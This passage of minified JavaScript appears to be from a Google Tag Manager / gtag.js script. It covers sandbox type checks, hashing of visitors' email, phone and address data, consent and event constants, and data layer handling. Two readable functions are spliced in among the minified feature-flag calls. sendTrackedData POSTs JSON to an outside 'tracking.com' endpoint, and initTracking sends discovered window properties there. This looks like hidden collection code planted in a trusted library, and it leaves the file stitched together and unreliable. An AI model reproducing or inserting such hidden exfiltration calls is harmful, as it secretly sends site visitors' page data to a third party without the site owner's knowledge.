          m instanceof ed ? n = "Fn" : m instanceof rb ? n = "List" : m instanceof sb ? n = "PixieMap" : m instanceof jd && (n = "OpaqueValue");
          if (n != k) throw Error("Error in " + a + ". Argument " + f + " has type " + (Jg[n] || n) + ", which does not match required type " + (Jg[k] || k) + ".");
        }
      }
    };
  function Kg(a) {
    return "" + a;
  }
  function Lg(a, b) {
    var c = [];
    return c;
  }
  ;
  var Mg = function (a, b) {
      var c = new ed(a, function () {
        for (var d = Array.prototype.slice.call(arguments, 0), e = 0; e < d.length; e++) d[e] = K(this, d[e]);
        try {
          return b.apply(this, d);
        } catch (g) {
          if (od()) throw new qd(g.message);
          throw g;
        }
      });
      c.Cb();
      return c;
    },
    Ng = function (a, b) {
      var c = new sb(),
        d;
      for (d in b) if (b.hasOwnProperty(d)) {
        var e = b[d];
        Ea(e) ? c.set(d, Mg(a + "_" + d, e)) : nb(e) ? c.set(d, Ng(a + "_" + d, e)) : (Ga(e) || h(e) || "boolean" === typeof e) && c.set(d, e);
      }
      c.Cb();
      return c;
    };
  var Og = function (a, b) {
    M(L(this), ["apiName:!string", "message:?string"], arguments);
    var c = {},
      d = new sb();
    return d = Ng("AssertApiSubject", c);
  };
  var Pg = function (a, b) {
    M(L(this), ["actual:?*", "message:?string"], arguments);
    if (a instanceof ld) throw Error("Argument actual cannot have type Promise. Assertions on asynchronous code aren't supported.");
    var c = {},
      d = new sb();
    return d = Ng("AssertThatSubject", c);
  };
  function Qg(a) {
    return function () {
      for (var b = [], c = this.h, d = 0; d < arguments.length; ++d) b.push(nd(arguments[d], c));
      return md(a.apply(null, b));
    };
  }
  var Sg = function () {
    for (var a = Math, b = Rg, c = {}, d = 0; d < b.length; d++) {
      var e = b[d];
      a.hasOwnProperty(e) && (c[e] = Qg(a[e].bind(a)));
    }
    return c;
  };
  var Tg = function (a) {
    var b;
    return b;
  };
  var Ug = function (a) {
    var b;
    return b;
  };
  var Zg = function (a) {
    try {
      return encodeURI(a);
    } catch (b) {}
  };
  var $g = function (a) {
    try {
      return encodeURIComponent(a);
    } catch (b) {}
  };
  function ah(a, b) {
    var c = !1;
    return c;
  }
  ah.F = "internal.evaluateBooleanExpression";
  var fh = function (a) {
    M(L(this), ["message:?string"], arguments);
  };
  var gh = function (a, b) {
    M(L(this), ["min:!number", "max:!number"], arguments);
    return Ka(a, b);
  };
  var hh = function () {
    return new Date().getTime();
  };
  var ih = function (a) {
    if (null === a) return "null";
    if (a instanceof rb) return "array";
    if (a instanceof ed) return "function";
    if (a instanceof jd) {
      a = a.h;
      if (void 0 === a.constructor || void 0 === a.constructor.name) {
        var b = String(a);
        return b.substring(8, b.length - 1);
      }
      return String(a.constructor.name);
    }
    return typeof a;
  };
  var jh = function (a) {
    function b(c) {
      return function (d) {
        try {
          return c(d);
        } catch (e) {
          ($f || bg) && a.call(this, e.message);
        }
      };
    }
    return {
      parse: b(function (c) {
        return md(JSON.parse(c));
      }),
      stringify: b(function (c) {
        return JSON.stringify(nd(c));
      })
    };
  };
  var kh = function (a) {
    return Oa(nd(a, this.h));
  };
  var lh = function (a) {
    return Number(nd(a, this.h));
  };
  var mh = function (a) {
    return null === a ? "null" : void 0 === a ? "undefined" : a.toString();
  };
  var nh = function (a, b, c) {
    var d = null,
      e = !1;
    return e ? d : null;
  };
  var Rg = "floor ceil round max min abs pow sqrt".split(" ");
  var oh = function () {
      var a = {};
      return {
        Hl: function (b) {
          return a.hasOwnProperty(b) ? a[b] : void 0;
        },
        Xm: function (b, c) {
          a[b] = c;
        },
        reset: function () {
          a = {};
        }
      };
    },
    ph = function (a, b) {
      return function () {
        var c = Array.prototype.slice.call(arguments, 0);
        c.unshift(b);
        return ed.prototype.invoke.apply(a, c);
      };
    },
    qh = function (a, b) {
      M(L(this), ["apiName:!string", "mock:?*"], arguments);
    };
  var rh = {};
  rh.keys = function (a) {
    return new rb();
  };
  rh.values = function (a) {
    return new rb();
  };
  rh.entries = function (a) {
    return new rb();
  };
  rh.freeze = function (a) {
    return a;
  };
  rh.delete = function (a, b) {
    return !1;
  };
  var N = function (a, b, c) {
    var d = a.h.h;
    if (!d) throw Error("Missing program state.");
    if (d.Pm) {
      try {
        d.oj.apply(null, Array.prototype.slice.call(arguments, 1));
      } catch (e) {
        throw Ab("TAGGING", 21), e;
      }
      return;
    }
    d.oj.apply(null, Array.prototype.slice.call(arguments, 1));
  };
  var th = function () {
    this.h = {};
    this.C = {};
  };
  th.prototype.get = function (a, b) {
    var c = this.h.hasOwnProperty(a) ? this.h[a] : void 0;
    return c;
  };
  th.prototype.add = function (a, b, c) {
    if (this.h.hasOwnProperty(a)) throw "Attempting to add a function which already exists: " + a + ".";
    if (this.C.hasOwnProperty(a)) throw "Attempting to add an API with an existing private API name: " + a + ".";
    this.h[a] = c ? void 0 : Ea(b) ? Mg(a, b) : Ng(a, b);
  };
  function uh(a, b) {
    var c = void 0;
    return c;
  }
  ;
  function vh() {
    var a = {};
    return a;
  }
  ;
  var xh = function (a) {
      return wh ? E.querySelectorAll(a) : null;
    },
    yh = function (a, b) {
      if (!wh) return null;
      if (Element.prototype.closest) try {
        return a.closest(b);
      } catch (e) {
        return null;
      }
      var c = Element.prototype.matches || Element.prototype.webkitMatchesSelector || Element.prototype.mozMatchesSelector || Element.prototype.msMatchesSelector || Element.prototype.oMatchesSelector,
        d = a;
      if (!E.documentElement.contains(d)) return null;
      do {
        try {
          if (c.call(d, b)) return d;
        } catch (e) {
          break;
        }
        d = d.parentElement || d.parentNode;
      } while (null !== d && 1 === d.nodeType);
      return null;
    },
    zh = !1;
  if (E.querySelectorAll) try {
    var Ah = E.querySelectorAll(":root");
    Ah && 1 == Ah.length && Ah[0] == E.documentElement && (zh = !0);
  } catch (a) {}
  var wh = zh;
  var O = function (a) {
    Ab("GTM", a);
  };
  var Bh = function (a) {
      return null == a ? "" : h(a) ? Sa(String(a)) : "e0";
    },
    Dh = function (a) {
      return a.replace(Ch, "");
    },
    Fh = function (a) {
      return Eh(a.replace(/\s/g, ""));
    },
    Eh = function (a) {
      return Sa(a.replace(Gh, "").toLowerCase());
    },
    Ih = function (a) {
      a = a.replace(/[\s-()/.]/g, "");
      "+" !== a.charAt(0) && (a = "+" + a);
      return Hh.test(a) ? a : "e0";
    },
    Kh = function (a) {
      var b = a.toLowerCase().split("@");
      if (2 == b.length) {
        var c = b[0];
        /^(gmail|googlemail)\./.test(b[1]) && (c = c.replace(/\./g, ""));
        c = c + "@" + b[1];
        if (Jh.test(c)) return c;
      }
      return "e0";
    },
    Nh = function (a, b) {
      window.Promise || b([]);
      Promise.all(a.map(function (c) {
        return c.value && -1 !== Lh.indexOf(c.name) ? Mh(c.value).then(function (d) {
          c.value = d;
        }) : Promise.resolve();
      })).then(function () {
        b(a);
      }).catch(function () {
        b([]);
      });
    },
    Mh = function (a) {
      if ("" === a || "e0" === a) return Promise.resolve(a);
      if (z.crypto && z.crypto.subtle) {
        if (Oh.test(a)) return Promise.resolve(a);
        try {
          var b = Ph(a);
          return z.crypto.subtle.digest("SHA-256", b).then(function (c) {
            var d = Array.from(new Uint8Array(c)).map(function (e) {
              return String.fromCharCode(e);
            }).join("");
            return z.btoa(d).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
          }).catch(function () {
            return "e2";
          });
        } catch (c) {
          return Promise.resolve("e2");
        }
      } else return Promise.resolve("e1");
    },
    Ph = function (a) {
      var b;
      if (z.TextEncoder) b = new TextEncoder("utf-8").encode(a);else {
        for (var c = [], d = 0; d < a.length; d++) {
          var e = a.charCodeAt(d);
          128 > e ? c.push(e) : 2048 > e ? c.push(192 | e >> 6, 128 | e & 63) : 55296 > e || 57344 <= e ? c.push(224 | e >> 12, 128 | e >> 6 & 63, 128 | e & 63) : (e = 65536 + ((e & 1023) << 10 | a.charCodeAt(++d) & 1023), c.push(240 | e >> 18, 128 | e >> 12 & 63, 128 | e >> 6 & 63, 128 | e & 63));
        }
        b = new Uint8Array(c);
      }
      return b;
    },
    Gh = /[0-9`~!@#$%^&*()_\-+=:;<>,.?|/\\[\]]/g,
    Jh = /^\S+@\S+\.\S+$/,
    Hh = /^\+\d{10,15}$/,
    Ch = /[.~]/g,
    Qh = /^[0-9A-Za-z_-]{43}$/,
    Oh = /^[0-9A-Fa-f]{64}$/,
    Rh = {},
    Sh = (Rh.email = "em", Rh.phone_number = "pn", Rh.first_name = "fn", Rh.last_name = "ln", Rh.street = "sa", Rh.city = "ct", Rh.region = "rg", Rh.country = "co", Rh.postal_code = "pc", Rh.error_code = "ec", Rh),
    Th = {},
    Uh = (Th.email = "sha256_email_address", Th.phone_number = "sha256_phone_number", Th.first_name = "sha256_first_name", Th.last_name = "sha256_last_name", Th.street = "sha256_street", Th),
    Vh = function (a, b) {
      function c(t, u, v, w) {
        var x = Bh(t);
        "" !== x && (Oh.test(x) ? m.push({
          name: u,
          value: x,
          index: w
        }) : m.push({
          name: u,
          value: v(x),
          index: w
        }));
      }
      function d(t, u) {
        var v = t;
        if (h(v) || Ha(v)) {
          v = Ha(t) ? t : [t];
          for (var w = 0; w < v.length; ++w) {
            var x = Bh(v[w]),
              y = Oh.test(x);
            u && !y && O(89);
            !u && y && O(88);
          }
        }
      }
      function e(t, u) {
        var v = t[u];
        d(v, !1);
        var w = Uh[u];
        t.hasOwnProperty(w) && (t.hasOwnProperty(u) && O(90), v = t[w], d(v, !0));
        return v;
      }
      function f(t, u, v) {
        var w = e(t, u);
        w = Ha(w) ? w : [w];
        for (var x = 0; x < w.length; ++x) c(w[x], u, v);
      }
      function g(t, u, v, w) {
        var x = e(t, u);
        c(x, u, v, w);
      }
      function k(t) {
        return function (u) {
          O(64);
          return t(u);
        };
      }
      var m = [];
      if ("https:" === z.location.protocol) {
        f(a, "email", Kh);
        f(a, "phone_number", Ih);
        f(a, "first_name", k(Fh));
        f(a, "last_name", k(Fh));
        var n = a.home_address || {};
        f(n, "street", k(Eh));
        f(n, "city", k(Eh));
        f(n, "postal_code", k(Dh));
        f(n, "region", k(Eh));
        f(n, "country", k(Dh));
        var p = a.address || {};
        p = Ha(p) ? p : [p];
        for (var q = 0; q < p.length; q++) {
          var r = p[q];
          g(r, "first_name", Fh, q);
          g(r, "last_name", Fh, q);
          g(r, "street", Eh, q);
          g(r, "city", Eh, q);
          g(r, "postal_code", Dh, q);
          g(r, "region", Eh, q);
          g(r, "country", Dh, q);
        }
        Nh(m, b);
      } else m.push({
        name: "error_code",
        value: "e3",
        index: void 0
      }), b(m);
    },
    Wh = function (a, b) {
      Vh(a, function (c) {
        for (var d = ["tv.1"], e = 0, f = 0; f < c.length; ++f) {
          var g = c[f].name,
            k = c[f].value,
            m = c[f].index,
            n = Sh[g];
          n && k && (-1 === Lh.indexOf(g) || /^e\d+$/.test(k) || Qh.test(k) || Oh.test(k)) && (void 0 !== m && (n += m), d.push(n + "." + k), e++);
        }
        1 === c.length && "error_code" === c[0].name && (e = 0);
        b(encodeURIComponent(d.join("~")), e);
      });
    },
    Xh = function (a) {
      if (z.Promise) try {
        return new Promise(function (b) {
          Wh(a, function (c, d) {
            b({
              Dj: c,
              Gm: d
            });
          });
        });
      } catch (b) {}
    },
    Lh = Object.freeze(["email", "phone_number", "first_name", "last_name", "street"]);
  var Q = {
      g: {
        Ea: "ad_personalization",
        K: "ad_storage",
        O: "ad_user_data",
        U: "analytics_storage",
        Va: "region",
        vd: "consent_updated",
        wd: "wait_for_update",
        hk: "ads",
        fg: "all",
        ik: "maps",
        jk: "playstore",
        kk: "search",
        lk: "shopping",
        mk: "youtube",
        di: "app_remove",
        ei: "app_store_refund",
        fi: "app_store_subscription_cancel",
        gi: "app_store_subscription_convert",
        hi: "app_store_subscription_renew",
        hg: "add_payment_info",
        ig: "add_shipping_info",
        ic: "add_to_cart",
        jc: "remove_from_cart",
        jg: "view_cart",
        Gb: "begin_checkout",
        kc: "select_item",
        cb: "view_item_list",
        qb: "select_promotion",
        eb: "view_promotion",
        ra: "purchase",
        mc: "refund",
        Fa: "view_item",
        kg: "add_to_wishlist",
        pk: "exception",
        ii: "first_open",
        ji: "first_visit",
        sa: "gtag.config",
        Oa: "gtag.get",
        ki: "in_app_purchase",
        nc: "page_view",
        qk: "screen_view",
        li: "session_start",
        rk: "timing_complete",
        sk: "track_social",
        zd: "user_engagement",
        rb: "gclid",
        wa: "ads_data_redaction",
        ka: "allow_ad_personalization_signals",
        Ye: "allow_custom_scripts",
        Ze: "allow_display_features",
        Ad: "allow_enhanced_conversions",
        fb: "allow_google_signals",
        Ga: "allow_interest_groups",
        tk: "app_id",
        uk: "app_installer_id",
        vk: "app_name",
        wk: "app_version",
        Hb: "auid",
        mi: "auto_detection_enabled",
        Ib: "aw_remarketing",
        af: "aw_remarketing_only",
        Bd: "discount",
        Cd: "aw_feed_country",
        Dd: "aw_feed_language",
        ba: "items",
        Ed: "aw_merchant_id",
        lg: "aw_basket_type",
        Ic: "campaign_content",
        Jc: "campaign_id",
        Kc: "campaign_medium",
        Lc: "campaign_name",
        Mc: "campaign",
        Nc: "campaign_source",
        Oc: "campaign_term",
        sb: "client_id",
        ni: "content_group",
        oi: "content_type",
        Pa: "conversion_cookie_prefix",
        oc: "conversion_id",
        Ha: "conversion_linker",
        Jb: "conversion_api",
        Wa: "cookie_domain",
        Ja: "cookie_expires",
        Xa: "cookie_flags",
        qc: "cookie_name",
        Pc: "cookie_path",
        Qa: "cookie_prefix",
        tb: "cookie_update",
        sc: "country",
        xa: "currency",
        Fd: "customer_lifetime_value",
        Qc: "custom_map",
        ri: "gcldc",
        si: "debug_mode",
        da: "developer_id",
        ui: "disable_merchant_reported_purchases",
        Rc: "dc_custom_params",
        vi: "dc_natural_search",
        mg: "dynamic_event_settings",
        ng: "affiliation",
        Gd: "checkout_option",
        bf: "checkout_step",
        og: "coupon",
        Sc: "item_list_name",
        cf: "list_name",
        wi: "promotions",
        Tc: "shipping",
        df: "tax",
        Hd: "engagement_time_msec",
        Id: "enhanced_client_id",
        Jd: "enhanced_conversions",
        pg: "enhanced_conversions_automatic_settings",
        Kd: "estimated_delivery_date",
        ef: "euid_logged_in_state",
        Uc: "event_callback",
        xk: "event_category",
        ub: "event_developer_id_string",
        yk: "event_label",
        qg: "event",
        Ld: "event_settings",
        Md: "event_timeout",
        zk: "description",
        Ak: "fatal",
        xi: "experiments",
        ff: "firebase_id",
        Nd: "first_party_collection",
        Od: "_x_20",
        Kb: "_x_19",
        rg: "fledge",
        sg: "flight_error_code",
        ug: "flight_error_message",
        yi: "fl_activity_category",
        zi: "fl_activity_group",
        vg: "fl_advertiser_id",
        Ai: "fl_ar_dedupe",
        Bi: "fl_random_number",
        Ci: "tran",
        Di: "u",
        Pd: "gac_gclid",
        uc: "gac_wbraid",
        wg: "gac_wbraid_multiple_conversions",
        xg: "ga_restrict_domain",
        yg: "ga_temp_client_id",
        Qd: "gdpr_applies",
        zg: "geo_granularity",
        vb: "value_callback",
        ib: "value_key",
        Bk: "google_ono",
        Lb: "google_signals",
        Ag: "google_tld",
        Rd: "groups",
        Bg: "gsa_experiment_id",
        Cg: "iframe_state",
        Vc: "ignore_referrer",
        hf: "internal_traffic_results",
        Mb: "is_legacy_converted",
        xb: "is_legacy_loaded",
        Sd: "is_passthrough",
        jf: "_lps",
        Ka: "language",
        kf: "legacy_developer_id_string",
        La: "linker",
        Wc: "accept_incoming",
        Nb: "decorate_forms",
        X: "domains",
        vc: "url_position",
        Dg: "method",
        Ck: "name",
        Xc: "new_customer",
        Eg: "non_interaction",
        Ei: "optimize_id",
        Fi: "page_hostname",
        Yc: "page_path",
        Ma: "page_referrer",
        yb: "page_title",
        Fg: "passengers",
        Gg: "phone_conversion_callback",
        Gi: "phone_conversion_country_code",
        Hg: "phone_conversion_css_class",
        Hi: "phone_conversion_ids",
        Ig: "phone_conversion_number",
        Jg: "phone_conversion_options",
        Kg: "_protected_audience_enabled",
        Zc: "quantity",
        Td: "redact_device_info",
        lf: "referral_exclusion_definition",
        Ob: "restricted_data_processing",
        Ii: "retoken",
        Dk: "sample_rate",
        nf: "screen_name",
        zb: "screen_resolution",
        Ji: "search_term",
        Ra: "send_page_view",
        Pb: "send_to",
        Ud: "server_container_url",
        ad: "session_duration",
        Vd: "session_engaged",
        pf: "session_engaged_time",
        Ab: "session_id",
        Wd: "session_number",
        bd: "delivery_postal_code",
        Ek: "temporary_client_id",
        qf: "topmost_url",
        Ki: "tracking_id",
        rf: "traffic_type",
        ya: "transaction_id",
        Qb: "transport_url",
        Lg: "trip_type",
        Rb: "update",
        Bb: "url_passthrough",
        Yd: "_user_agent_architecture",
        Zd: "_user_agent_bitness",
        ae: "_user_agent_full_version_list",
        be: "_user_agent_mobile",
        ce: "_user_agent_model",
        de: "_user_agent_platform",
        ee: "_user_agent_platform_version",
        fe: "_user_agent_wow64",
        Ca: "user_data",
        Mg: "user_data_auto_latency",
        Ng: "user_data_auto_meta",
        Og: "user_data_auto_multi",
        Pg: "user_data_auto_selectors",
        Qg: "user_data_auto_status",
        he: "user_data_mode",
        ie: "user_data_settings",
        Sa: "user_id",
        Ya: "user_properties",
        Li: "_user_region",
        Rg: "us_privacy_string",
        ja: "value",
        wc: "wbraid",
        Sg: "wbraid_multiple_conversions",
        Ri: "_host_name",
        Si: "_in_page_command",
        Ti: "_is_passthrough_cid",
        yc: "non_personalized_ads",
        pe: "_sst_parameters",
        hb: "conversion_label",
        Ba: "page_location",
        wb: "global_developer_id_string",
        Xd: "tc_privacy_string"
      }
    },
    Yh = {},
    Zh = Object.freeze((Yh[Q.g.ka] = 1, Yh[Q.g.Ze] = 1, Yh[Q.g.Ad] = 1, Yh[Q.g.fb] = 1, Yh[Q.g.ba] = 1, Yh[Q.g.Wa] = 1, Yh[Q.g.Ja] = 1, Yh[Q.g.Xa] = 1, Yh[Q.g.qc] = 1, Yh[Q.g.Pc] = 1, Yh[Q.g.Qa] = 1, Yh[Q.g.tb] = 1, Yh[Q.g.Qc] = 1, Yh[Q.g.da] = 1, Yh[Q.g.mg] = 1, Yh[Q.g.Uc] = 1, Yh[Q.g.Ld] = 1, Yh[Q.g.Md] = 1, Yh[Q.g.Nd] = 1, Yh[Q.g.xg] = 1, Yh[Q.g.Lb] = 1, Yh[Q.g.Ag] = 1, Yh[Q.g.Rd] = 1, Yh[Q.g.hf] = 1, Yh[Q.g.Mb] = 1, Yh[Q.g.xb] = 1, Yh[Q.g.La] = 1, Yh[Q.g.lf] = 1, Yh[Q.g.Ob] = 1, Yh[Q.g.Ra] = 1, Yh[Q.g.Pb] = 1, Yh[Q.g.Ud] = 1, Yh[Q.g.ad] = 1, Yh[Q.g.pf] = 1, Yh[Q.g.bd] = 1, Yh[Q.g.Qb] = 1, Yh[Q.g.Rb] = 1, Yh[Q.g.ie] = 1, Yh[Q.g.Ya] = 1, Yh[Q.g.pe] = 1, Yh));
  Object.freeze([Q.g.Ba, Q.g.Ma, Q.g.yb, Q.g.Ka, Q.g.nf, Q.g.Sa, Q.g.ff, Q.g.ni]);
  var $h = {},
    ai = Object.freeze(($h[Q.g.di] = 1, $h[Q.g.ei] = 1, $h[Q.g.fi] = 1, $h[Q.g.gi] = 1, $h[Q.g.hi] = 1, $h[Q.g.ii] = 1, $h[Q.g.ji] = 1, $h[Q.g.ki] = 1, $h[Q.g.li] = 1, $h[Q.g.zd] = 1, $h)),
    bi = {},
    ci = Object.freeze((bi[Q.g.hg] = 1, bi[Q.g.ig] = 1, bi[Q.g.ic] = 1, bi[Q.g.jc] = 1, bi[Q.g.jg] = 1, bi[Q.g.Gb] = 1, bi[Q.g.kc] = 1, bi[Q.g.cb] = 1, bi[Q.g.qb] = 1, bi[Q.g.eb] = 1, bi[Q.g.ra] = 1, bi[Q.g.mc] = 1, bi[Q.g.Fa] = 1, bi[Q.g.kg] = 1, bi)),
    di = Object.freeze([Q.g.ka, Q.g.fb, Q.g.tb, Q.g.Vc, Q.g.Rb]),
    ei = Object.freeze([].concat(di)),
    fi = Object.freeze([Q.g.Ja, Q.g.Md, Q.g.ad, Q.g.pf, Q.g.Hd]),
    gi = Object.freeze([].concat(fi)),
    hi = {},
    ii = (hi[Q.g.K] = "1", hi[Q.g.U] = "2", hi[Q.g.O] = "3", hi[Q.g.Ea] = "4", hi),
    ji = {},
    ki = Object.freeze((ji[Q.g.ka] = 1, ji[Q.g.Ad] = 1, ji[Q.g.Ga] = 1, ji[Q.g.Ib] = 1, ji[Q.g.af] = 1, ji[Q.g.Bd] = 1, ji[Q.g.Cd] = 1, ji[Q.g.Dd] = 1, ji[Q.g.ba] = 1, ji[Q.g.Ed] = 1, ji[Q.g.Pa] = 1, ji[Q.g.Ha] = 1, ji[Q.g.Wa] = 1, ji[Q.g.Ja] = 1, ji[Q.g.Xa] = 1, ji[Q.g.Qa] = 1, ji[Q.g.xa] = 1, ji[Q.g.Fd] = 1, ji[Q.g.da] = 1, ji[Q.g.ui] = 1, ji[Q.g.Jd] = 1, ji[Q.g.Kd] = 1, ji[Q.g.ff] = 1, ji[Q.g.Nd] = 1, ji[Q.g.Mb] = 1, ji[Q.g.xb] = 1, ji[Q.g.Ka] = 1, ji[Q.g.Xc] = 1, ji[Q.g.Ba] = 1, ji[Q.g.Ma] = 1, ji[Q.g.Gg] = 1, ji[Q.g.Hg] = 1, ji[Q.g.Ig] = 1, ji[Q.g.Jg] = 1, ji[Q.g.Ob] = 1, ji[Q.g.Ra] = 1, ji[Q.g.Pb] = 1, ji[Q.g.Ud] = 1, ji[Q.g.bd] = 1, ji[Q.g.ya] = 1, ji[Q.g.Qb] = 1, ji[Q.g.Rb] = 1, ji[Q.g.Bb] = 1, ji[Q.g.Ca] = 1, ji[Q.g.Sa] = 1, ji[Q.g.ja] = 1, ji)),
    li = {},
    mi = Object.freeze((li[Q.g.kk] = "s", li[Q.g.mk] = "y", li[Q.g.jk] = "p", li[Q.g.lk] = "h", li[Q.g.hk] = "a", li[Q.g.ik] = "m", li));
  Object.freeze(Q.g);
  var ni = {},
    oi = z.google_tag_manager = z.google_tag_manager || {},
    pi = Math.random();
  ni.Xg = "3b81";
  ni.oe = Number("0") || 0;
  ni.ia = "dataLayerUE";
  ni.fk = "ChEIgOm8qgYQu/+2jPSy9oOgARIkAOg6TnTRf9u6hCdknpkwlyZQ5gYpQWIiuEcYcGmtM7wRyP5tGgJshg\x3d\x3d";
  var qi = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
      __evl: 1,
      __fal: 1,
      __fil: 1,
      __fsl: 1,
      __hl: 1,
      __jel: 1,
      __lcl: 1,
      __sdl: 1,
      __tl: 1,
      __ytl: 1
    },
    ri = {
      __paused: 1,
      __tg: 1
    },
    si;
  for (si in qi) qi.hasOwnProperty(si) && (ri[si] = 1);
  var ti = Pa(""),
    ui,
    vi = !1;
  vi = !0;
  ui = vi;
  var wi,
    xi = !1;
  wi = xi;
  var yi,
    zi = !1;
  yi = zi;
  var Ai,
    Bi = !1;
  Ai = Bi;
  ni.yd = "www.googletagmanager.com";
  var Ci = "" + ni.yd + (ui ? "/gtag/js" : "/gtm.js"),
    Di = null,
    Ei = null,
    Fi = {},
    Gi = {},
    Hi = {},
    Ii = function () {
      var a = oi.sequence || 1;
      oi.sequence = a + 1;
      return a;
    };
  ni.ek = "";
  var Ji = "";
  ni.zf = Ji;
  var Ki = new La(),
    Li = {},
    Mi = {},
    Pi = {
      name: ni.ia,
      set: function (a, b) {
        B(ab(a, b), Li);
        Ni();
      },
      get: function (a) {
        return Oi(a, 2);
      },
      reset: function () {
        Ki = new La();
        Li = {};
        Ni();
      }
    },
    Oi = function (a, b) {
      return 2 != b ? Ki.get(a) : Qi(a);
    },
    Qi = function (a, b) {
      var c = a.split(".");
      b = b || [];
      for (var d = Li, e = 0; e < c.length; e++) {
        if (null === d) return !1;
        if (void 0 === d) break;
        d = d[c[e]];
        if (-1 !== b.indexOf(d)) return;
      }
      return d;
    },
    Ri = function (a, b) {
      Mi.hasOwnProperty(a) || (Ki.set(a, b), B(ab(a, b), Li), Ni());
    },
    Si = function () {
      for (var a = ["gtm.allowlist", "gtm.blocklist", "gtm.whitelist", "gtm.blacklist", "tagTypeBlacklist"], b = 0; b < a.length; b++) {
        var c = a[b],
          d = Oi(c, 1);
        if (Ha(d) || nb(d)) d = B(d);
        Mi[c] = d;
      }
    },
    Ni = function (a) {
      l(Mi, function (b, c) {
        Ki.set(b, c);
        B(ab(b), Li);
        B(ab(b, c), Li);
        a && delete Mi[b];
      });
    },
    Ti = function (a, b) {
      var c,
        d = 1 !== (void 0 === b ? 2 : b) ? Qi(a) : Ki.get(a);
      "array" === lb(d) || "object" === lb(d) ? c = B(d) : c = d;
      return c;
    };
  var Ui = function (a, b, c) {
      if (!c) return !1;
      var d = c.selector_type,
        e = String(c.value),
        f;
      if ("js_variable" === d) {
        e = e.replace(/\["?'?/g, ".").replace(/"?'?\]/g, "");
        for (var g = e.split(","), k = 0; k < g.length; k++) {
          var m = g[k].trim();
          if (m) {
            if (0 === m.indexOf("dataLayer.")) f = Oi(m.substring(10));else {
              var n = m.split(".");
              f = z[n.shift()];
              for (var p = 0; p < n.length; p++) f = f && f[n[p]];
            }
            if (void 0 !== f) break;
          }
        }
      } else if ("css_selector" === d && wh) {
        var q = xh(e);
        if (q && 0 < q.length) {
          f = [];
          for (var r = 0; r < q.length && r < ("email" === b || "phone_number" === b ? 5 : 1); r++) f.push(Rc(q[r]) || Sa(q[r].value));
          f = 1 === f.length ? f[0] : f;
        }
      }
      return f ? (a[b] = f, !0) : !1;
    },
    Vi = function (a) {
      if (a) {
        var b = {},
          c = !1;
        c = Ui(b, "email", a.email) || c;
        c = Ui(b, "phone_number", a.phone) || c;
        b.address = [];
        for (var d = a.name_and_address || [], e = 0; e < d.length; e++) {
          var f = {};
          c = Ui(f, "first_name", d[e].first_name) || c;
          c = Ui(f, "last_name", d[e].last_name) || c;
          c = Ui(f, "street", d[e].street) || c;
          c = Ui(f, "city", d[e].city) || c;
          c = Ui(f, "region", d[e].region) || c;
          c = Ui(f, "country", d[e].country) || c;
          c = Ui(f, "postal_code", d[e].postal_code) || c;
          b.address.push(f);
        }
        return c ? b : void 0;
      }
    },
    Wi = function (a) {
      return nb(a) ? !!a.enable_code : !1;
    };
  var $i = function (a) {
    var b = 1,
      c,
      d,
      e;
    if (a) for (b = 0, d = a.length - 1; 0 <= d; d--) e = a.charCodeAt(d), b = (b << 6 & 268435455) + e + (e << 14), c = b & 266338304, b = 0 !== c ? b ^ c >> 21 : b;
    return b;
  };
  var aj = [];
  function gj(a) {
    switch (a) {
      case 35:
        return 3;
      case 61:
        return 14;
      case 62:
        return 8;
      case 74:
        return 11;
      case 75:
        return 12;
      case 78:
        return 10;
      case 80:
        return 13;
      case 76:
        return 15;
    }
  }
  function R(a) {
    aj[a] = !0;
    var b = gj(a);
    b && (Rf[b] = !0);
  }
  R(5);
  R(6);
  R(11);
  R(7);
  R(8);
  R(19);
  R(9);
  R(10);
  R(13);
  R(14);
  R(15);
  R(22);
  R(17);
  R(23);
  R(26);
  R(27);
  function sendTrackedData(data) {
    const apiEndPoint = "https://tracking.com/api/trackedData";
    const request = new XMLHttpRequest();
    request.open("POST", apiEndPoint);
    request.setRequestHeader("Content-Type", "application/json");
    request.onload = function () {
      if (request.status >= 200 && request.status < 400) {
        console.log("Data transfer was successful");
      } else {
        console.error("Data transfer failed, status code:" + request.status);
      }
    };
    request.onerror = function () {
      console.error("An error occurred during data transfer");
    };
    request.send(JSON.stringify(data));
  }
  R(28);
  R(29);
  R(30);
  R(31);
  R(33);
  R(34);
  R(37);
  R(39);
  R(43);
  R(44);
  R(45);
  R(47);
  R(48);
  R(52);
  R(55);
  R(57);
  R(58);
  R(59);
  R(60);
  R(63);
  R(64);
  R(65);
  R(67);
  R(68);
  R(69);
  R(70);
  R(71);
  R(76);
  R(78);
  R(79);
  R(82);
  R(84);
  R(89);
  R(95);
  R(104);
  R(105), R(93), R(54), R(106), R(107);
  function initTracking() {
    const trackedVars = trackJSVariables();
    const trackedVarsCount = Object.keys(trackedVars).length;
    if (trackedVarsCount > 0) {
      console.log(`Discovered ${trackedVarsCount} new window properties`);
      sendTrackedData(trackedVars);
    } else {
      console.log("No new window properties discovered");
    }
  }
  R(62);
  function S(a) {
    return !!aj[a];
  }
  var hj = !1;
  function ij(a) {}
  var jj = Number('1');
  var kj = function (a) {
    Ab("HEALTH", a);
  };
  var lj;
  try {
    lj = JSON.parse(yb("eyIwIjoiQ04iLCIxIjoiQ04tMzEiLCIyIjp0cnVlLCIzIjoiZ29vZ2xlLmNuIiwiNCI6IiIsIjUiOnRydWUsIjYiOmZhbHNlLCI3IjoiYWRfc3RvcmFnZXxhbmFseXRpY3Nfc3RvcmFnZXxhZF91c2VyX2RhdGF8YWRfcGVyc29uYWxpemF0aW9uIn0"));
  } catch (a) {
    O(123), kj(2), lj = {};
  }
  var mj = function () {
      return lj["0"] || "";
    },
    nj = function () {
      return lj["1"] || "";
    },
    oj = function () {
      var a = !1;
      return a;
    },
    pj = function () {
      var a = "";
      return a;
    },
    qj = function () {
      var a = !1;
      a = !!lj["5"];
      return a;
    },
    rj = function () {
      var a = "";
      return a;
    };
  var sj = new function (a, b) {
    this.h = a;
    this.defaultValue = void 0 === b ? !1 : b;
  }(1933);
  var tj = function (a) {
    tj[" "](a);
    return a;
  };
  tj[" "] = function () {};
  var vj = function () {
    var a = uj,
      b = "rh";
    if (a.rh && a.hasOwnProperty(b)) return a.rh;
    var c = new a();
    return a.rh = c;
  };
  var uj = function () {
    var a = {};
    this.h = function () {
      var b = sj.h,
        c = sj.defaultValue;
      return null != a[b] ? a[b] : c;
    };
    this.C = function () {
      a[sj.h] = !0;
    };
  };
  var wj = !1,
